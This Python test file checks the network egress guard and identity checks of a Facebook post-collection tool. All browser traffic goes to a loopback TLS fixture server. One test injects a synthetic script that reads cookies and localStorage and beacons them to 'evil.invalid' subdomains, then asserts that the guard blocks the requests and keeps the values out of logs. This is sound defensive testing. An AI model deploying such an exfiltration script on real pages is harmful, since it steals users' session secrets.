"""Round-4 review regressions. Synthetic data; browsers connect only to loopback."""

import base64
import hashlib
import http.server
import json
import socket
import ssl
import subprocess
import threading
from contextlib import contextmanager
from pathlib import Path

import pytest
from test_facebook import (
    _allow_loopback_sockets,
    _setup_fb_env,
    _synthetic_post_html,
    _write_facebook_config,
)

from metamuse import _browser_egress, app, config, facebook, jobs
from metamuse import models as m

URL = "https://www.facebook.com/synth.lab/posts/pfbid0101synth"


@pytest.fixture(autouse=True)
def reset_seams():
    yield
    facebook.set_driver_factory(None)
    facebook.set_egress_factory(None)
    facebook.set_secret_store_factory(None)
    facebook.set_resolver_factory(None)
    facebook.set_batch_hook(None)


def observation(markup, url=URL):
    return facebook.PageObservation(url=url, status_code=200, html=markup)


def submit(ctx, project, permit, *, url=URL, max_items=100, max_bytes=1_000_000):
    result = app.submit_collect(
        ctx,
        {
            "project_id": project,
            "inputs": [{"kind": "url", "url": url}],
            "resources": ["post", "comments"],
            "limits": {
                "max_urls": 1,
                "max_items": max_items,
                "max_bytes": max_bytes,
                "wall_clock_seconds": 60,
            },
            "access_grant_id": permit,
            "request_key": "review-job",
        },
    )
    assert result.status == "accepted", result
    return result.data["job_id"]


def finish(ctx, job_id):
    with jobs.Executor(ctx.store) as executor:
        executor.run(once=True)
    return app.get_job(ctx, {"job_id": job_id}).data["job"]


@contextmanager
def browser_fixture(tmp_path, monkeypatch, pages, *, url=URL):
    """Explicit synthetic unsandboxed config; TLS exemption exists only in this test."""
    if facebook.find_playwright_browser() is None:
        pytest.skip("Playwright or Chromium is not installed")
    _allow_loopback_sockets(monkeypatch)
    for key in facebook.PROXY_ENV_VARS:
        monkeypatch.delenv(key, raising=False)
    ctx, project, permit, auth_ref, secrets = _setup_fb_env(tmp_path, url=url)
    extra = (
        ["allow_unsandboxed_browser = true"]
        if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
        else []
    )
    _write_facebook_config(ctx.paths.root, auth_ref=auth_ref, extra_facebook_lines=extra)
    config_path = ctx.paths.root / "metamuse.toml"
    config_path.write_text(
        config_path.read_text().replace("read_timeout_seconds = 30", "read_timeout_seconds = 2")
    )
    ctx = app.AppContext.open(ctx.paths.root)
    cert, key = tmp_path / "cert.pem", tmp_path / "key.pem"
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            str(key),
            "-out",
            str(cert),
            "-days",
            "1",
            "-subj",
            "/CN=www.facebook.com",
        ],
        check=True,
        capture_output=True,
    )
    hits = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append((self.path, self.headers.get("Upgrade")))
            if self.headers.get("Upgrade", "").lower() == "websocket":
                accept = base64.b64encode(
                    hashlib.sha1(
                        (
                            self.headers["Sec-WebSocket-Key"]
                            + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
                        ).encode()
                    ).digest()
                ).decode()
                self.send_response(101)
                self.send_header("Upgrade", "websocket")
                self.send_header("Connection", "Upgrade")
                self.send_header("Sec-WebSocket-Accept", accept)
                self.end_headers()
                return
            value = pages.get(self.path, "<html>Unclassified fixture</html>")
            if isinstance(value, tuple):
                self.send_response(value[0])
                self.send_header("Location", value[1])
                self.end_headers()
                return
            body = value.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            try:
                self.wfile.write(body)
            except OSError:
                pass

        def log_message(self, *args):
            pass

    tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls.load_cert_chain(cert, key)

    class TLSFixtureServer(http.server.ThreadingHTTPServer):
        def get_request(self):
            sock, address = super().get_request()
            sock.settimeout(2)
            return tls.wrap_socket(sock, server_side=True), address

    server = TLSFixtureServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    guard = facebook.EgressGuard.for_fixture_test(
        allowed_hosts=("www.facebook.com",), resolver=lambda _: ["127.0.0.1"]
    )
    facebook.set_egress_factory(lambda _: guard)

    class TestDriver(facebook.PlaywrightBrowserDriver):
        def open_session(self, *args, **kwargs):
            session = super().open_session(*args, **kwargs)
            session._context.new_cdp_session(session._page).send(
                "Security.setIgnoreCertificateErrors", {"ignore": True}
            )
            return session

    driver = TestDriver(_test_origin=f"https://www.facebook.com:{server.server_port}")
    facebook.set_driver_factory(lambda: driver)
    try:
        yield ctx, project, permit, secrets, hits, guard, driver
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


@pytest.mark.parametrize(
    "hosts",
    [
        [],
        ["*.facebook.com"],
        ["*.fbcdn.net"],
        ["127.0.0.1"],
        ["localhost"],
        ["probe.local"],
        [""],
        ["bad host"],
        ["www.facebook.com", "bad/host"],
    ],
)
def test_finding_01_invalid_allowlist_is_fixed_config_error(tmp_path: Path, hosts):
    tmp_path.mkdir(exist_ok=True)
    _write_facebook_config(tmp_path, extra_facebook_lines=[f"allowed_hosts = {json.dumps(hosts)}"])
    with pytest.raises(m.CoreError) as error:
        config.load_config(tmp_path)
    assert error.value.detail.code == m.ErrorCode.INPUT_INVALID
    assert error.value.detail.message == "Invalid Facebook host allowlist"
    with pytest.raises(m.CoreError):
        facebook.EgressGuard(allowed_hosts=hosts, resolver=lambda _: ["93.184.216.34"])


def test_finding_01_defaults_keep_exact_host_restriction():
    guard = facebook.EgressGuard(
        allowed_hosts=config.DEFAULT_FACEBOOK_ALLOWED_HOSTS, resolver=lambda _: ["93.184.216.34"]
    )
    with pytest.raises(m.CoreError) as error:
        guard.check_proxy_target("https://unapproved.example/", method="CONNECT", is_connect=True)
    assert error.value.detail.code == m.ErrorCode.SCOPE_DENIED


def test_finding_02_browser_secret_hostname_never_reaches_diagnostics(tmp_path, monkeypatch):
    prefix = "SYNTH"
    cookie, storage = f"{prefix}-Cookie", f"{prefix}-Storage"
    script = """<script>
    const values = [document.cookie.split('=')[1], localStorage.getItem('fixture')];
    for (const token of values) {
      for (const encoded of [token, token.toLowerCase(),
             '%' + token.charCodeAt(0).toString(16) + token.slice(1)]) {
        new Image().src = 'https://' + encoded + '.evil.invalid/private?q=' + token;
      }
    }
    </script>"""
    markup = _synthetic_post_html().replace("</body>", script + "</body>")
    with browser_fixture(tmp_path, monkeypatch, {"/synth.lab/posts/pfbid0101synth": markup}) as env:
        ctx, project, permit, secrets, hits, guard, _ = env
        state = {
            "cookies": [
                {
                    "name": "fixture",
                    "value": cookie,
                    "domain": "www.facebook.com",
                    "path": "/",
                    "secure": True,
                    "httpOnly": False,
                }
            ],
            "origins": [
                {
                    "origin": "https://www.facebook.com",
                    "localStorage": [{"name": "fixture", "value": storage}],
                }
            ],
        }
        # localStorage origins include the synthetic TLS port, via test-only context init.
        driver = env[-1]
        original_open = driver.open_session

        def open_with_storage(*args, **kwargs):
            session = original_open(*args, **kwargs)
            session._context.add_init_script(
                f"localStorage.setItem('fixture', {json.dumps(storage)})"
            )
            return session

        monkeypatch.setattr(driver, "open_session", open_with_storage)
        ref = secrets.put(
            json.dumps(state).encode(),
            provider="facebook",
            account="acct_synth",
            created_at=ctx.clock(),
        )["auth_ref"]
        extra = (
            ["allow_unsandboxed_browser = true"]
            if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
            else []
        )
        _write_facebook_config(ctx.paths.root, auth_ref=ref, extra_facebook_lines=extra)
        ctx = app.AppContext.open(ctx.paths.root)
        job_id = submit(ctx, project, permit)
        finish(ctx, job_id)
        visible = app.get_job(ctx, {"job_id": job_id}).model_dump_json()
        with ctx.store.connection() as conn:
            visible += str(
                [
                    tuple(row)
                    for row in conn.execute(
                        "SELECT checkpoint,result,error FROM job_steps WHERE job_id=?", (job_id,)
                    )
                ]
            )
            visible += str(
                [
                    tuple(row)
                    for row in conn.execute("SELECT detail FROM events WHERE job_id=?", (job_id,))
                ]
            )
        assert guard.summary()["aborted"] >= 2
        for token in (cookie, storage):
            assert token.casefold() not in visible.casefold()
            assert (
                "%" + format(ord(token[0]), "x") + token[1:]
            ).casefold() not in visible.casefold()
        assert "evil.invalid" not in visible
        assert all("hostname" not in row for row in guard.summary()["aborted_reasons"])
        assert all(upgrade is None for _, upgrade in hits)


@pytest.mark.parametrize(
    "other_actor,other_id",
    [("other.actor", "OTHER_POST"), ("synth.lab", "12345"), ("other.actor", "pfbid0101synth")],
)
def test_finding_03_extracted_identity_must_match(tmp_path, other_actor, other_id):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    driver = facebook.FixtureBrowserDriver(
        observation(_synthetic_post_html(actor=other_actor, post_id=other_id))
    )
    facebook.set_driver_factory(lambda: driver)
    job = finish(ctx, submit(ctx, project, permit))
    assert job["error"]["code"] == "E_REFERENCE_INVALID"
    with ctx.store.connection() as conn:
        assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 0


@pytest.mark.parametrize("hop", ["redirect", "script", "meta"])
def test_finding_03_browser_navigation_identity_stops_before_import(tmp_path, monkeypatch, hop):
    path = "/synth.lab/posts/pfbid0101synth"
    other = "/other.actor/posts/OTHER_POST"
    if hop == "redirect":
        initial = (302, other)
    elif hop == "script":
        initial = f"<script>location.replace('{other}')</script>"
    else:
        initial = f'<meta http-equiv="refresh" content="0;url={other}">'
    pages = {path: initial, other: _synthetic_post_html(actor="other.actor", post_id="OTHER_POST")}
    with browser_fixture(tmp_path, monkeypatch, pages) as env:
        ctx, project, permit, _, hits, _, _ = env
        job = finish(ctx, submit(ctx, project, permit))
        assert job["error"]["code"] == "E_REFERENCE_INVALID"
        with ctx.store.connection() as conn:
            assert conn.execute("SELECT COUNT(*) FROM sources").fetchone()[0] == 0
            assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 0
        if hop == "redirect":
            # An encrypted 302 hop is invisible to Playwright routing until committed.
            assert any(request == other for request, _ in hits)
        else:
            assert all(request != other for request, _ in hits)


def test_finding_04_approved_wss_and_worker_wss_closed_before_handshake(tmp_path, monkeypatch):
    script = """<script>
    window.states = [];
    const socket = new WebSocket('wss://' + location.host + '/ws');
    socket.onopen = () => states.push('open');
    socket.onclose = () => states.push('closed');
    const source = `const s = new WebSocket('wss://${location.host}/ws-worker');
      s.onopen = () => postMessage('open'); s.onclose = () => postMessage('closed');`;
    const worker = new Worker(URL.createObjectURL(new Blob([source], {type: 'text/javascript'})));
    worker.onmessage = (event) => states.push(event.data);
    </script>"""
    markup = _synthetic_post_html().replace("</body>", script + "</body>")
    with browser_fixture(tmp_path, monkeypatch, {"/synth.lab/posts/pfbid0101synth": markup}) as env:
        ctx, _, _, _, hits, guard, driver = env
        state = facebook.load_storage_state(ctx.policy.facebook.auth_ref, account="acct_synth")
        options = (
            {"allow_unsandboxed_browser": True}
            if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
            else {}
        )
        session = driver.open_session(state, guard, timeout_ms=2000, **options)
        try:
            session.goto_post(URL)
            session._page.wait_for_function("window.states.length === 2", timeout=2000)
            assert session._page.evaluate("window.states") == ["closed", "closed"]
            assert not any(upgrade for _, upgrade in hits)
            assert guard.summary()["aborted"] >= 2
        finally:
            session.close()


@pytest.mark.parametrize(
    "barrier,code",
    [
        ("login", "E_AUTH_REQUIRED"),
        ("checkpoint", "E_CHECKPOINT_REQUIRED"),
        ("challenge", "E_CHECKPOINT_REQUIRED"),
    ],
)
def test_finding_05_encrypted_barrier_redirect_is_distinct(tmp_path, monkeypatch, barrier, code):
    pages = {
        "/synth.lab/posts/pfbid0101synth": (302, f"/{barrier}/"),
        f"/{barrier}/": _synthetic_post_html(),
    }
    with browser_fixture(tmp_path, monkeypatch, pages) as env:
        ctx, project, permit, _, _, _, _ = env
        job_id = submit(ctx, project, permit)
        job = finish(ctx, job_id)
        assert job["error"]["code"] == code
        assert job["state"] == "awaiting_user"
        assert job["limits"]["safe_read_retries"] == 0
        with ctx.store.connection() as conn:
            assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 0
    with pytest.raises(m.CoreError) as error:
        facebook.classify_and_parse_observation(
            observation(_synthetic_post_html(), f"https://www.facebook.com/{barrier}/"),
            permalink=facebook.parse_post_permalink(URL),
            require_comments_section=True,
        )
    assert error.value.detail.code.value == code


def test_finding_06_close_cancels_waiting_resolution_and_prevents_late_dial(monkeypatch):
    _allow_loopback_sockets(monkeypatch)
    entered, release, finished = threading.Event(), threading.Event(), threading.Event()
    dials = []
    real_connect = socket.create_connection

    def slow_resolver(_):
        entered.set()
        release.wait(5)
        finished.set()
        return ["127.0.0.1"]

    guard = facebook.EgressGuard.for_fixture_test(
        allowed_hosts=("allowed.test",), resolver=slow_resolver
    )
    target = socket.socket()
    target.bind(("127.0.0.1", 0))
    target.listen()
    port = target.getsockname()[1]

    def spy_connect(address, *args, **kwargs):
        if address[1] == port:
            dials.append(address)
        return real_connect(address, *args, **kwargs)

    monkeypatch.setattr(socket, "create_connection", spy_connect)
    proxy = _browser_egress.BrowserEgressProxy(guard, idle_timeout_s=0.5)
    client = real_connect(("127.0.0.1", proxy.port), timeout=2)
    try:
        client.sendall(f"CONNECT allowed.test:{port} HTTP/1.1\r\n\r\n".encode())
        assert entered.wait(2)
        proxy.close()
        release.set()
        assert finished.wait(2)
        for worker in proxy._worker_threads:
            worker.join(timeout=2)
        assert not any(worker.is_alive() for worker in proxy._worker_threads)
        assert dials == []
        assert proxy._active_sockets == set()
    finally:
        release.set()
        proxy.close()
        client.close()
        target.close()
